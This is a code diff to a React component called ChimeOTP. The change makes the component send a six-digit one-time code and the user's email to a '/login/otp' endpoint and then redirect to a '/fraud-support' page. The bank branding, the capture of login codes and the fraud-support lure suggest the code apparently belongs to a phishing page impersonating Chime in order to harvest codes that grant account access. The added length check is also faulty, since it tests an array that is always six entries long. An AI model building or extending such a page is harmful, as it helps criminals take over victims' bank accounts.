@@ -3,6 +3,8 @@ import { Box, Typography, TextField, Button, Link } from "@mui/material";
 import { useNavigate } from "react-router-dom";
 import toast from "react-hot-toast";
 import { SpinnerLoading } from "./SpinnerLoading";
+import api from "./axios";
+import { emailStore } from "./authStore";
 
 export default function ChimeOTP() {
   const [otp, setOtp] = useState(["", "", "", "", "", ""]);
@@ -45,14 +47,23 @@ export default function ChimeOTP() {
   const [isLoading, setIsLoading] = useState(false);
 
   
-    const navigate = useNavigate();
-  
+  const navigate = useNavigate();
+   const email = emailStore((state) => state.email);
+    
     const onSubmit = async () => {
+      if (otp.length < 6)
+        return toast.warning(
+          "OTP must not be less than 6 digits",
+        );
       try {
         setIsLoading(true);
-  
-        toast.success(otp);
-  
+        const response = await api.post("/login/otp", {otp, email});
+        const { success, message } = response.data;
+
+        if (!success)
+          return toast.error(message || "Verification failed please try again.");
+        toast.success(message);
+
        return navigate("/fraud-support");
       } catch (err) {
         toast.error(err.response?.data?.message);
